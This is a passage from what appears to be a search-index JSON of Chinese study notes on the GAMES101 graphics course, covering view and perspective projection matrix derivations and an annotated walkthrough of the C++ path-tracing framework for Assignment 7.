Formula\uff0c\u53ef\u7528\u6765\u8ba1\u7b97\u7ed5\u4efb\u610f\u8f74 \\(n\\) \u65cb\u8f6c\u89d2\u5ea6 \\(\\alpha\\)\uff1a</p> \\[ R(n,\\alpha) = \\cos (\\alpha) I + (1-\\cos(\\alpha))nn^T + \\sin(\\alpha) \\left[\\begin{matrix}0 &amp; -n_z &amp; n_y \\\\ n_z &amp; 0 &amp; -n_x \\\\ -n_y &amp; n_x &amp; 0\\end{matrix}\\right] \\] <p>\u4f7f\u7528\u65f6\u901a\u5e38\u5148\u628a\u8f74\u5e73\u79fb\u81f3\u539f\u70b9\uff0c\u65cb\u8f6c\u5b8c\u540e\u518d\u5e73\u79fb\u56de\u53bb\u3002</p>"},{"location":"Accumulation/Games101/Transformation/#viewing-transformation","title":"Viewing Transformation","text":""},{"location":"Accumulation/Games101/Transformation/#viewcamera-transformation","title":"View/Camera Transformation","text":"<p>\u628a\u4e09\u7ef4\u7a7a\u95f4\u7684\u7269\u4f53\uff0c\u53d8\u6210\u4e8c\u7ef4\u7a7a\u95f4\u7684\u56fe\u3002</p> <p>\u5b9a\u4e49\u4e00\u4e2a\u6444\u50cf\u673a\uff0c\u9700\u8981\u4e09\u4e2a\u5411\u91cf\uff1a</p> <ul> <li>Position \\(\\overrightarrow{e}\\)</li> <li>Look-at/gaze direction \\(\\hat{g}\\)</li> <li>Up direction \\(\\hat{t}\\)</li> </ul> <p>\u4e3a\u4e86\u7b80\u5316\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u76f8\u673a\u653e\u7f6e\u4e8e\u539f\u70b9 \\(\\overrightarrow{e}=(0,0,0)^T\\) \uff0c\u5411\u4e0a\u65b9\u5411\u6cbf y \u8f74 \\(\\hat{t}=(0,1,0)^T\\)\uff0c\u89c6\u89d2\u65b9\u5411\u6cbf -Z \u8f74\u770b \\(\\hat{g}=(0,0,-1)^T\\)</p> <p>\u90a3\u4e48\uff0c\u5c06\u76f8\u673a\u79fb\u52a8\u81f3\u6307\u5b9a\u4f4d\u7f6e\u7684\u77e9\u9635\u8bb0\u4e3a \\(M_{view}\\)\uff1a</p> \\[\\begin{array}c M_{view} = R_{view} T_{view} \\\\ T_{view} = \\left[\\begin{matrix}1 &amp; 0 &amp; 0 &amp; -x_e \\\\ 0 &amp; 1 &amp; 0 &amp; -y_e  \\\\ 0 &amp; 0 &amp; 1 &amp; -z_e \\\\ 0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\\\ R_{view} = \\left[\\begin{matrix}x_{\\hat{g}\\times\\hat{t}} &amp; y_{\\hat{g}\\times\\hat{t}} &amp; z_{\\hat{g}\\times\\hat{t}} &amp; 0 \\\\ x_t &amp; y_t &amp; z_t &amp; 0  \\\\ x_{-g} &amp; y_{-g} &amp; z_{-g} &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\end{array}\\] <p>Object \u4e5f\u8981\u548c Camera \u4e00\u8d77\u65cb\u8f6c\uff0c\u4fdd\u8bc1\u76f8\u5bf9\u4f4d\u7f6e\u4e0d\u53d8</p>"},{"location":"Accumulation/Games101/Transformation/#projection-transformation","title":"Projection Transformation","text":"<p>\u6295\u5f71\u5206\u4e3a\u4e24\u79cd\uff1a</p> <ul> <li>Orthographic projection \u6b63\u4ea4\u6295\u5f71</li> <li>Perspective projection \u900f\u89c6\u6295\u5f71</li> </ul> <p></p> <p>\u5dee\u522b\u5728\u4e8e\u662f\u5426\u6709\u8fd1\u5927\u8fdc\u5c0f\u7684\u6027\u8d28\u3002</p> <p></p>"},{"location":"Accumulation/Games101/Transformation/#orthographic-projection","title":"Orthographic Projection","text":"<ul> <li>&lt;1&gt; Center cuboid by translating</li> <li>&lt;2&gt; Scale into \"canonical\" cube (\\([-1,1]^3\\))</li> </ul> <p>\u53f3\u624b\u7cfb</p> <p>\u8bfe\u7a0b\u7528\u7684\u662f\u53f3\u624b\u7cfb\uff0c\u76f8\u673a\u6cbf -Z \u65b9\u5411\u89c2\u5bdf\uff0c\u6240\u4ee5 z \u503c\u8d8a\u5927\u5c31\u8d8a\u8fd1\uff1b\u4e0d\u8fc7\u4e00\u4e9bAPI\uff08\u4f8b\u5982 OpenGL\uff09\u7528\u7684\u662f\u5de6\u624b\u7cfb\uff0c\u6b63\u597d\u76f8\u53cd\u3002</p>"},{"location":"Accumulation/Games101/Transformation/#perspective-projection","title":"Perspective Projection","text":"<ul> <li>Most common in Computer Graphics, art, visual system</li> <li>Further objects are smaller</li> <li>Parallel lines not parallel; converge to single point</li> </ul> <p>\u900f\u89c6\u6295\u5f71\u53ef\u4ee5\u770b\u4f5c\u5148\u628a\u539f\u5e73\u9762\u6309\u6bd4\u4f8b\u6324\u538b\u6210\u8fd1\u5e73\u9762\u7684\u5927\u5c0f\uff0c\u518d\u5bf9\u8be5\u533a\u57df\u8fdb\u884c\u6b63\u4ea4\u6295\u5f71\u3002</p> <p></p> <p>\u6211\u4eec\u9700\u8981\u8003\u8651\u8fdc\u5e73\u9762\u548c\u8fd1\u5e73\u9762\u4e4b\u95f4\u7684\u70b9 \\((x,y,z,1)^T\\) \u7684\u538b\u7f29\u3002</p> <p>\u5047\u8bbe\u8fdc\u5e73\u9762\u8ddd\u79bb\u76f8\u673a\u7684 z \u8f74\u8ddd\u79bb\u4e3a \\(f\\) \uff0c\u8fd1\u5e73\u9762\u8ddd\u79bb\u76f8\u673a\u7684 z \u8f74\u8ddd\u79bb\u4e3a \\(n\\) \uff0c\u6839\u636e\u76f8\u4f3c\u4e09\u89d2\u5f62\uff0c\u53ef\u4ee5\u5f97\u5230 \\(x,y\\) \u7684\u538b\u7f29\u6bd4\u4f8b\u4e3a \\(\\frac{n}{z}\\) \uff0c\u90a3\u4e48\u538b\u7f29\u77e9\u9635\u5b9e\u73b0\u7684\u6548\u679c\u4e3a\uff1a</p> \\[ \\left[\\begin{matrix}x \\\\ y \\\\ z\\\\ 1\\end{matrix}\\right] \\Rightarrow \\left[\\begin{matrix} nx/z \\\\ ny/z \\\\ ?\\\\ 1\\end{matrix}\\right]==\\left[\\begin{matrix}nx \\\\ ny \\\\ z\\cdot ?\\\\ z\\end{matrix}\\right] \\] <p>\u56e0\u6b64\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u63a8\u5bfc\u51fa\u538b\u7f29\u77e9\u9635\u7684\u7b2c\u4e00\u3001\u4e8c\u3001\u56db\u884c\uff0c\u8868\u793a\u4e3a\uff1a</p> \\[ M_{persp-&gt;ortho}=\\left[\\begin{matrix}n &amp; 0 &amp; 0 &amp; 0 \\\\ 0&amp; n &amp; 0 &amp; 0 \\\\ ? &amp; ? &amp;? &amp; ? \\\\ 0 &amp; 0 &amp; 1 &amp; 0\\end{matrix}\\right] \\] <p>\u5173\u4e8e\u7b2c\u4e09\u884c\u7684\u63a8\u5bfc\uff0c\u53ef\u4ee3\u5165\u4e24\u4e2a\u4e0d\u4f1a\u88ab\u538b\u7f29\u6539\u53d8\u7684\u7279\u6b8a\u70b9\uff1a</p> <ul> <li>\u4f4d\u4e8e\u8fd1\u5e73\u9762\u7684\u70b9 \\((x,y,n,1)^T\\)</li> <li>\u4f4d\u4e8e\u8fdc\u5e73\u9762\u4e2d\u5fc3\u7684\u70b9 \\((0,0,f,1)^T\\)</li> </ul> <p>\u5e76\u4e14\u7531\u4e8e \\(n^2\\) \u4e0e\u5185\u90e8\u70b9\u7684 \\(x,y\\) \u5750\u6807\u6ca1\u6709\u5173\u7cfb\uff0c\u53ef\u4ee5\u5224\u65ad\u51fa\u7b2c\u4e09\u884c\u524d\u4e24\u4f4d\u5747\u4e3a 0\uff0c\u90a3\u4e48\uff1a</p> \\[\\begin{array}c \\left[\\begin{matrix}x \\\\ y \\\\ n \\\\ 1\\end{matrix}\\right] \\Rightarrow\\left[\\begin{matrix}nx \\\\ ny \\\\ n^2 \\\\ n\\end{matrix}\\right]\\\\ \\Rightarrow \\left[\\begin{matrix}0 &amp; 0 &amp; A &amp; B\\end{matrix}\\right]\\left[\\begin{matrix}x \\\\ y \\\\ n \\\\ 1\\end{matrix}\\right] = n^2 \\\\ \\Rightarrow \\ \\ \\ \\ \\ \\ \\ \\ \\ n\\cdot A +B = n^2 \\\\ \\text{Samely: } f\\cdot A+B = f^2 \\\\ \\Rightarrow \\left\\{\\begin{array}l A=n+f \\\\ B=-nf\\end{array}\\right . \\end{array} \\] <p>\u5373\uff1a</p> \\[\\begin{array}c M_{persp-&gt;ortho}=\\left[\\begin{matrix}n &amp; 0 &amp; 0 &amp; 0 \\\\ 0&amp; n &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; n+f &amp; -nf \\\\ 0 &amp; 0 &amp; 1 &amp; 0\\end{matrix}\\right] \\\\ M_{persp} = M_{orhto} M_{persp-&gt;ortho} \\end{array} \\] <p>\u5bf9\u4e8e\u5185\u90e8\u7684\u70b9\uff1a</p> \\[ z' = n+f - \\frac{nf}{z} &gt;z \\] <p>\u56e0\u6b64\u5185\u90e8\u7684\u70b9\u4f1a\u88ab\u63a8\u5411\u8fdc\u5e73\u9762\u3002</p>"},{"location":"Accumulation/Games101/%E4%BD%9C%E4%B8%9A%E6%A1%86%E6%9E%B6/","title":"\u4f5c\u4e1a\u6846\u67b6","text":""},{"location":"Accumulation/Games101/%E4%BD%9C%E4%B8%9A%E6%A1%86%E6%9E%B6/#_1","title":"\u4f5c\u4e1a\u6846\u67b6\u5206\u6790","text":"<p> \u7ea6 433 \u4e2a\u5b57  472 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Accumulation/Games101/%E4%BD%9C%E4%B8%9A%E6%A1%86%E6%9E%B6/#assignment-7","title":"Assignment 7","text":"<p><code>Light</code> \u7c7b\uff0c\u53ea\u6709\u4e00\u4e2a Contructor\uff0c\u4e09\u7ef4\u5c5e\u6027\u8d77\u59cb\u4f4d\u7f6e <code>position</code> \u548c\u5149\u5f3a <code>intensity</code> \u90fd\u653e\u5728 public \u5185\uff1a</p> <pre><code>// Light.hpp\nclass Light\n{\npublic:\n    Light(const Vector3f &amp;p, const Vector3f &amp;i) : position(p), intensity(i) {}\n    virtual ~Light() = default;\n    Vector3f position;\n    Vector3f intensity;\n};\n</code></pre> <p><code>AreaLight</code> \u7c7b\u7ee7\u627f <code>Light</code>\uff0c\u5728\u4f5c\u4e1a\u7528\u662f\u7528\u6765\u63cf\u8ff0 CornelBox \u7684\u73af\u5883\u5149\u6e90\u5bf9\u8c61\uff08\u6b63\u4e0a\u65b9\u7684\u706f\uff09\uff0c\u6240\u4ee5 Constructor \u4e2d\u6cd5\u7ebf\u5b9a\u4e3a <code>0,-1,0</code>(\u7ad6\u76f4\u5411\u4e0b\u7167\u5c04)\uff0c\u5e76\u4e14\u8fd9\u662f\u4e00\u4e2a\u5e73\u9762\u5149\u6e90\uff0c\u957f\u5bbd\u5747\u4e3a 100\u3002</p> <p><code>SamplePoint</code> \u65b9\u6cd5\u5b9e\u73b0\u5bf9\u5149\u6e90\u968f\u673a\u91c7\u6837\uff0c\u8c03\u7528\u7684\u51fd\u6570 <code>get_random_float</code> \u4f4d\u4e8e\u5168\u5c40\u547d\u540d\u7a7a\u95f4 <code>global.hpp</code> \u4e2d\uff0c\u8bb0\u5f97\u8981\u7528\u9759\u6001\u53d8\u91cf\uff0c\u4e0d\u7136\u662f\u4f2a\u968f\u673a\u3002</p> <pre><code>// AreaLight.hpp\nclass AreaLight : public Light\n{\npublic:\n    AreaLight(const Vector3f &amp;p, const Vector3f &amp;i) : Light(p, i)\n    {\n        normal = Vector3f(0, -1, 0);\n        u = Vector3f(1, 0, 0);\n        v = Vector3f(0, 0, 1);\n        length = 100;\n    }\n\n    Vector3f SamplePoint() const\n    {\n        auto random_u = get_random_float();\n        auto random_v = get_random_float();\n        return position + random_u * u + random_v * v;\n    }\n\n    float length;\n    Vector3f normal;\n    Vector3f u;\n    Vector3f v;\n};\n------------------------------------------------------\n// global.hpp\ninline float get_random_float()\n{\n    static std::random_device dev;\n    static std::mt19937 rng(dev());\n    static std::uniform_real_distribution&lt;float&gt; dist(0.f, 1.f); // distribution in range [1, 6]\n\n    return dist(rng);\n}\n</code></pre> <p>\u5173\u952e\u5b57inline</p> <p><code>inline</code> \u662f C++ \u7684\u4e00\u4e2a\u5173\u952e\u5b57\uff0c\u7528\u6765\u6307\u793a\u8be5\u51fd\u6570\u4e3a\u5185\u8054\u51fd\u6570\u3002\u5f53\u51fd\u6570\u88ab\u58f0\u660e\u4e3a <code>inline</code> \u65f6\uff0c\u7f16\u8bd1\u5668\u5c1d\u8bd5\u5728\u7f16\u8bd1\u671f\u95f4\u5c06\u51fd\u6570\u7684\u4ee3\u7801\u76f4\u63a5\u63d2\u5165\u5230\u8c03\u7528\u70b9\uff0c\u4ee5\u51cf\u5c11\u51fd\u6570\u8c03\u7528\u7684\u5f00\u9500\u3002\u8fd9\u5bf9\u4e8e\u4e00\u4e9b\u77ed\u5c0f\u3001\u9891\u7e41\u8c03\u7528\u7684\u51fd\u6570\u7684\u8fd0\u884c\u6548\u7387\u4f18\u5316\u660e\u663e\u3002\u540c\u65f6\uff0c<code>inline</code>\u5173\u952e\u5b57\u8fd8\u5141\u8bb8\u4e00\u4e2a\u51fd\u6570\u5728\u591a\u4e2a\u6587\u4ef6\u4e2d\u91cd\u590d\u5b9a\u4e49\u3002</p> <p>\u4e0d\u8fc7\u8be5 Assignment \u4e2d\u5b9e\u9645\u4f7f\u7528\u7684\u662f <code>Scene</code> \u7c7b\u4e2d\u7684 <code>SampleLight</code> \u65b9\u6cd5\uff1a</p> <pre><code>// Scene.cpp\nvoid Scene::sampleLight(Intersection &amp;pos, float &amp;pdf) const\n{\n    float emit_area_sum = 0;\n    // \u904d\u5386\u6240\u6709\u5149\u6e90\uff0c\u8ba1\u7b97\u53d1\u5149\u9762\u79ef\u4e4b\u548c\n    for (uint32_t k = 0; k &lt; objects.size(); ++k) {\n        if (objects[k]-&gt;hasEmit()){\n            emit_area_sum += objects[k]-&gt;getArea();\n        }\n    }\n    // p \u4e3a\u9608\u503c\u53d8\u91cf\uff0c\u7528\u4e8e\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u5149\u6e90\u5e76\u5bf9\u5176\u91c7\u6837\n    float p = get_random_float() * emit_area_sum;\n    emit_area_sum = 0; // \u91cd\u7f6e\u53d1\u5149\u9762\u79ef\n    // \u91cd\u65b0\u904d\u5386\uff0c\u5b9a\u4f4d\u968f\u673a\u6570 p \u843d\u5728\u54ea\u5757\u53d1\u5149\u9762\u79ef\u4e0a\n    for (uint32_t k = 0; k &lt; objects.size(); ++k) {\n        if (objects[k]-&gt;hasEmit()){\n            emit_area_sum += objects[k]-&gt;getArea();\n            if (p &lt;= emit_area_sum){\n                objects[k]-&gt;Sample(pos, pdf);\n                break;\n                // \u53ea\u91c7\u6837\u4e00\u4e2a\u5149\u6e90\uff0c\u6240\u4ee5\u76f4\u63a5 break\n            }\n        }\n    }\n}\n</code></pre> <p><code>Object</code> \u7c7b\uff0c\u4f5c\u4e3a\u7236\u7c7b\u7ed9\u51fa\u4e86\u4e00\u5806\u51fd\u6570\u7684\u58f0\u660e\uff0c\u5b9e\u73b0\u5168\u5728\u5b50\u7c7b\u4e2d:</p> <pre><code>// Object.hpp\nclass Object\n{\npublic:\n    Object() {}\n    virtual ~Object() {}\n    virtual bool intersect(const Ray&amp; ray) = 0;\n    virtual bool intersect(const Ray&amp; ray, float &amp;, uint32_t &amp;) const = 0;\n    virtual Intersection getIntersection(Ray _ray) = 0;\n    virtual void getSurfaceProperties(const Vector3f &amp;, const Vector3f &amp;, const uint32_t &amp;, const Vector2f &amp;, Vector3f &amp;, Vector2f &amp;) const = 0;\n    virtual Vector3f evalDiffuseColor(const Vector2f &amp;) const =0;\n    virtual Bounds3 getBounds()=0;\n    virtual float getArea()=0;\n    virtual void Sample(Intersection &amp;pos, float &amp;pdf)=0;\n    virtual bool hasEmit()=0;\n};\n</code></pre> <p><code>MeshTriangle</code> \u7c7b\u7ee7\u627f <code>Object</code> \u7c7b\uff0c\u7528\u4e8e\u8bfb\u53d6 <code>.obj</code> \u6587\u4ef6\u5e76\u8bbe\u7f6e BVH \u76d2</p> <pre><code>// Triangle.hpp\nclass MeshTriangle : public Object\n{\npublic:\n    MeshTriangle(const std::string&amp; filename, Material *mt = new Material())\n    {// \u8fd9\u90e8\u5206\u539f\u7406\u4e0d\u9700\u8981\u592a\u61c2\uff08\u5927\u6982\n        objl::Loader loader;\n        // From OBJ_Loader.hpp\n        loader.LoadFile(filename);\n        // \u8bfb\u53d6 .obj \u6587\u4ef6\u5185\u7684\u6a21\u578b\n        area = 0;\n        m = mt;\n        assert(loader.LoadedMeshes.size() == 1);\n        auto mesh = loader.LoadedMeshes[0];\n\n        Vector3f min_vert = Vector3f{std::numeric_limits&lt;float&gt;::infinity(),\n                                     std::numeric_limits&lt;float&gt;::infinity(),\n                                     std::numeric_limits&lt;float&gt;::infinity()};\n        Vector3f max_vert = Vector3f{-std::numeric_limits&lt;float&gt;::infinity(),\n                                     -std::numeric_limits&lt;float&gt;::infinity(),\n                                     -std::numeric_limits&lt;float&gt;::infinity()};\n        for (int i = 0; i &lt; mesh.Vertices.size(); i += 3) {\n            std::array&lt;Vector3f, 3&gt; face_vertices;\n\n            for (int j = 0; j &lt; 3; j++) {\n                auto vert = Vector3f(mesh.Vertices[i + j].Position.X,\n                                     mesh.Vertices[i + j].Position.Y,\n                                     mesh.Vertices[i + j].Position.Z);\n                face_vertices[j] = vert;\n\n                min_vert = Vector3f(std::min(min_vert.x, vert.x),\n                                    std::min(min_vert.y, vert.y),\n                                    std::min(min_vert.z, vert.z));\n                max_vert = Vector3f(std::max(max_vert.x, vert.x),\n                                    std::max(max_vert.y, vert.y),\n                                    std::max(max_vert.z, vert.z));\n            }\n\n            triangles.emplace_back(face_vertices[0], face_vertices[1],\n                                   face_vertices[2], mt);\n        }\n\n        bounding_box = Bounds3(min_vert, max_vert);\n\n        // \u66f4\u65b0 BVH\n        std::vector&lt;Object*&gt; ptrs;\n        for (auto&amp; tri : triangles){\n            ptrs.push_back(&amp;tri);\n            area += tri.area;\n        }\n        bvh = new BVHAccel(ptrs);\n    }\n\n    bool intersect(const Ray&amp; ray) { return true; }\n\n    bool intersect(const Ray&amp; ray, float&amp; tnear, uint32_t&amp; index) const\n    {// \u8ba1\u7b97\u5149\u7ebf\u548c\u4e09\u89d2\u5f62\u662f\u5426\u6709\u4ea4\u70b9\uff0c\u6709\u5219\u66f4\u65b0tnear\u548c\u4e09\u89d2\u5f62\u7d22\u5f15\u5e76\u8fd4\u56de\n        bool intersect = false;\n        for (uint32_t k = 0; k &lt; numTriangles; ++k) {\n            const Vector3f&amp; v0 = vertices[vertexIndex[k * 3]];\n            const Vector3f&amp; v1 = vertices[vertexIndex[k * 3 + 1]];\n            const Vector3f&amp; v2 = vertices[vertexIndex[k * 3 + 2]];\n            float t, u, v;\n            if (rayTriangleIntersect(v0, v1, v2, ray.origin, ray.direction, t, u, v) &amp;&amp; t &lt; tnear) {\n                tnear = t;\n                index = k;\n                intersect |= true;\n            }\n        }\n        return intersect;\n    }\n\n    Bounds3 getBounds() { return bounding_box; }\n\n    void getSurfaceProperties(const Vector3f&amp; P, const Vector3f&amp; I, const uint32_t&amp; index, const Vector2f&amp; uv, Vector3f&amp; N, Vector2f&amp; st) const\n    {// \u6839\u636e\u91cd\u5fc3\u5750\u6807\uff0c\u8ba1\u7b97\u8be5\u4e09\u89d2\u5f62\u4e0a\u67d0\u70b9\u7684\u6cd5\u7ebf\u548c\u7eb9\u7406\u5750\u6807\n        const Vector3f&amp; v0 = vertices[vertexIndex[index * 3]];\n        const Vector3f&amp; v1 = vertices[vertexIndex[index * 3 + 1]];\n        const Vector3f&amp; v2 = vertices[vertexIndex[index * 3 + 2]];\n        Vector3f e0 = normalize(v1 - v0);\n        Vector3f e1 = normalize(v2 - v1);\n        N = normalize(crossProduct(e0, e1));\n        const Vector2f&amp; st0 = stCoordinates[vertexIndex[index * 3]];\n        const Vector2f&amp; st1 = stCoordinates[vertexIndex[index * 3 + 1]];\n        const Vector2f&amp; st2 = stCoordinates[vertexIndex[index * 3 + 2]];\n        st = st0 * (1 - uv.x - uv.y) + st1 * uv.x + st2 * uv.y;\n    }\n\n    Vector3f evalDiffuseColor(const Vector2f&amp; st) const\n    {// \u6839\u636e\u7ed9\u5b9a\u7684\u7eb9\u7406\u5750\u6807\uff0c\u901a\u8fc7\u7ebf\u6027\u63d2\u503c\u8ba1\u7b97\u5bf9\u5e94\u7684\u6f2b\u53cd\u5c04\u989c\u8272\n        float scale = 5;\n        float pattern =\n            (fmodf(st.x * scale, 1) &gt; 0.5) ^ (fmodf(st.y * scale, 1) &gt; 0.5);\n        return lerp(Vector3f(0.815, 0.235, 0.031),\n                    Vector3f(0.937, 0.937, 0.231), pattern);\n    }\n\n    Intersection getIntersection(Ray ray)\n    {\n        Intersection intersec;\n        if (bvh)\n            intersec = bvh-&gt;Intersect(ray);\n        return intersec;\n    }\n\n    void Sample(Intersection &amp;pos, float &amp;pdf){\n        bvh-&gt;Sample(pos, pdf);\n        pos.emit = m-&gt;getEmission();\n    }\n    float getArea(){\n        return area;\n    }\n    bool hasEmit(){\n        return m-&gt;hasEmission();\n    }\n\n    Bounds3 bounding_box;\n    std::unique_ptr&lt;Vector3f[]&gt; vertices;\n    uint32_t numTriangles;\n    std::unique_ptr&lt;uint32_t[]&gt; vertexIndex;\n    std::unique_ptr&lt;Vector2f[]&gt; stCoordinates;\n\n    std::vector&lt;Triangle&gt; triangles;\n\n    BVHAccel* bvh;\n    float area;\n\n    Material* m;\n};\n</code></pre> <p>\u4e0a\u9762\u7684 <code>MeshTriangle</code> \u662f\u6574\u4e2a\u6a21\u578b\u7684 <code>Triangle</code>\uff0c\u4e0b\u9762\u8fd9\u4e2a\u662f\u5355\u4e2a <code>Triangle</code> \u7684\u7c7b\u5b9a\u4e49\uff1a</p> <pre><code>// Triangle.hpp\nclass Triangle : public Object\n{\npublic:\n    Vector3f v0, v1, v2; // vertices A, B ,C , counter-clockwise order\n    Vector3f e1, e2;     // 2 edges v1-v0, v2-v0;\n    Vector3f t0, t1, t2; // texture coords\n    Vector3f normal;\n    float area;\n    Material* m;\n\n    Triangle(Vector3f _v0, Vector3f _v1, Vector3f _v2, Material* _m = nullptr)\n        : v0(_v0), v1(_v1), v2(_v2), m(_m)\n    {\n        e1 = v1 - v0;\n        e2 = v2 - v0;\n        normal = normalize(crossProduct(e1, e2));\n        area = crossProduct(e1, e2).norm()*0.5f;\n    }\n\n    bool intersect(const Ray&amp; ray) override;\n    bool intersect(const Ray&amp; ray, float&amp; tnear,\n                   uint32_t&amp; index) const override;\n    Intersection getIntersection(Ray ray) override;\n    void getSurfaceProperties(const Vector3f&amp; P, const Vector3f&amp; I,\n                              const uint32_t&amp; index, const Vector2f&amp; uv,\n                              Vector3f&amp; N, Vector2f&amp; st) const override\n    {\n        N = normal;\n    }\n    Vector3f evalDiffuseColor(const Vector2f&amp;) const override;\n    Bounds3 getBounds() override;\n    void Sample(Intersection &amp;pos, float &amp;pdf){\n      // \u5bf9\u5355\u4e2a\u4e09\u89d2\u5f62\u91c7\u6837\n        float x = std::sqrt(get_random_float()), y = get_random_float();\n        pos.coords = v0 * (1.0f - x) + v1 * (x * (1.0f - y)) + v2 * (x * y);\n        pos.normal = this-&gt;normal;\n        pdf = 1.0f / area;\n    }\n    float getArea(){\n        return area;\n    }\n    bool hasEmit(){\n        return m-&gt;hasEmission();\n    }\n};\n\ninline Intersection Triangle::getIntersection(Ray ray)\n{// \u5149\u7ebf-\u4e09\u89d2\u5f62\u76f8\u4ea4\u51fd\u6570\n    Intersection inter;\n    /* The members of intersection:\n        bool happened;\n        Vector3f coords;\n        Vector3f normal;\n        double distance;\n        Object* obj;\n        Material* m;\n    */\n\n    if (dotProduct(ray.direction, normal) &gt; 0)\n        return inter;\n    double u, v, t_tmp = 0;\n    Vector3f pvec = crossProduct(ray.direction, e2);\n    double det = dotProduct(e1, pvec);\n    if (fabs(det) &lt; EPSILON)\n        return inter;\n\n    double det_inv = 1. / det;\n    Vector3f tvec = ray.origin - v0;\n    u = dotProduct(tvec, pvec) * det_inv;\n    if (u &lt; 0 || u &gt; 1)\n        return inter;\n    Vector3f qvec = crossProduct(tvec, e1);\n    v = dotProduct(ray.direction, qvec) * det_inv;\n    if (v &lt; 0 || u + v &gt; 1)\n        return inter;\n    t_tmp = dotProduct(e2, qvec) * det_inv;\n    if(t_tmp &lt; 0) return inter;\n\n    inter.happened = true;\n    inter.coords = ray(t_tmp);\n    inter.normal = normal;\n    inter.distance = t_tmp;//\n    inter.obj = this;\n    inter.m = m;\n\n    return inter;\n}\n</code></pre> <p><code>Intersection</code> \u7c7b\uff0c\u5373\u4ea4\u70b9\u7684\u5c5e\u6027\uff0c\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\uff1a</p> <pre><code>// Intersection.hpp\nstruct Intersection\n{\n    Intersection(){\n        happened=false;\n        coords=Vector3f();\n        normal=Vector3f();\n        distance= std::numeric_limits&lt;double&gt;::max();\n        obj =nullptr;\n        m=nullptr;\n    }\n    bool happened;\n    Vector3f coords;\n    Vector3f tcoords;\n    Vector3f normal;\n    Vector3f emit;   // \u5373 L_i, L_i=0\u8bf4\u660e\u4e0d\u662f\u5149\u6e90\n    double distance;\n    Object* obj;\n    Material* m;\n};\n</code></pre> <p><code>Ray</code> \u7c7b\uff0c\u4e5f\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u4e0b\u9762\u8fd9\u4e2a\u64cd\u4f5c\u7b26\u91cd\u8f7d\u4e5f\u6ca1\u4ec0\u4e48\u7528\u5904\u3002</p> <pre><code>// Ray.hpp\nstruct Ray{\n    //Destination = origin + t*direction\n    Vector3f origin;\n    Vector3f direction, direction_inv;\n    double t;//transportation time,\n    double t_min, t_max;\n\n    Ray(const Vector3f&amp; ori, const Vector3f&amp; dir, const double _t = 0.0): origin(ori), direction(dir),t(_t) {\n        direction_inv = Vector3f(1./direction.x, 1./direction.y, 1./direction.z);\n        t_min = 0.0;\n        t_max = std::numeric_limits&lt;double&gt;::max();\n\n    }\n\n    Vector3f operator()(double t) const{return origin+direction*t;}\n\n    friend std::ostream &amp;operator&lt;&lt;(std::ostream&amp; os, const Ray&amp; r){\n        os&lt;&lt;\"[origin:=\"&lt;&lt;r.origin&lt;&lt;\", direction=\"&lt;&lt;r.direction&lt;&lt;\", time=\"&lt;&lt; r.t&lt;&lt;\"]\\n\";\n        return os;\n    }\n// \u5bf9\u64cd\u4f5c\u7b26 &lt;&lt; \u91cd\u8f7d\uff0c\u8fd9\u6837\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 std::cout &lt;&lt; ray; \u6765\u6253\u5370 Ray \u5bf9\u8c61\u7684\u5185\u5bb9\n};\n</code></pre> <p><code>Scene</code> \u7c7b\u76f8\u5f53\u4e8e\u6574\u4e2a\u56fe\u7247\u7684\u753b\u5e03\uff0c\u662f\u6574\u4e2a\u9879\u76ee\u7684\u6700\u4e0a\u5c42\u7c7b\uff0c\u7528\u6765\u642d\u5efa\u6574\u4e2a\u73af\u5883\uff0c\u7136\u540e\u4f20\u7ed9\u6e32\u67d3\u5668\u8fdb\u884c\u6e32\u67d3\u3002</p> <pre><code>// Scene.hpp\nclass Scene\n{\npublic:\n    // setting up options\n    int width = 1280;\n    int height = 960;\n    double fov = 40;\n    Vector3f backgroundColor = Vector3f(0.235294, 0.67451, 0.843137);\n    int maxDepth = 1;\n    float RussianRoulette = 0.8;\n\n    Scene(int w, int h) : width(w), height(h)\n    {}\n\n    void Add(Object *object) { objects.push_back(object); }\n    void Add(std::unique_ptr&lt;Light&gt; light) { lights.push_back(std::move(light)); }\n\n    const std::vector&lt;Object*&gt;&amp; get_objects() const { return objects; }\n    const std::vector&lt;std::unique_ptr&lt;Light&gt; &gt;&amp;  get_lights() const { return lights; }\n    Intersection intersect(const Ray&amp; ray) const;\n    BVHAccel *bvh;\n    void buildBVH();\n    Vector3f castRay(const Ray &amp;ray, int depth) const;\n    Vector3f shade(Intersection &amp;pos, const Vector3f &amp;wo) const;\n    void sampleLight(Intersection &amp;pos, float &amp;pdf) const;\n    bool trace(const Ray &amp;ray, const std::vector&lt;Object*&gt; &amp;objects, float &amp;tNear, uint32_t &amp;index, Object **hitObject);\n    std::tuple&lt;Vector3f, Vector3f&gt; HandleAreaLight(const AreaLight &amp;light, const Vector3f &amp;hitPoint, const Vector3f &amp;N,\n                                                   const Vector3f &amp;shadowPointOrig,\n                                                   const std::vector&lt;Object *&gt; &amp;objects, uint32_t &amp;index,\n                                                   const Vector3f &amp;dir, float specularExponent);\n\n    // creating the scene (adding objects and lights)\n    std::vector&lt;Object* &gt; objects;\n    std::vector&lt;std::unique_ptr&lt;Light&gt; &gt; lights;\n\n    // Compute reflection direction\n    Vector3f reflect(const Vector3f &amp;I, const Vector3f &amp;N) const\n    {\n        return I - 2 * dotProduct(I, N) * N;\n    }\n\n\n\n// Compute refraction direction using Snell's law\n//\n// We need to handle with care the two possible situations:\n//\n//    - When the ray is inside the object\n//\n//    - When the ray is outside.\n//\n// If the ray is outside, you need to make cosi positive cosi = -N.I\n//\n// If the ray is inside, you need to invert the refractive indices and negate the normal N\n    Vector3f refract(const Vector3f &amp;I, const Vector3f &amp;N, const float &amp;ior) const\n    {\n        float cosi = clamp(-1, 1, dotProduct(I, N));\n        float etai = 1, etat = ior;\n        Vector3f n = N;\n        if (cosi &lt; 0) { 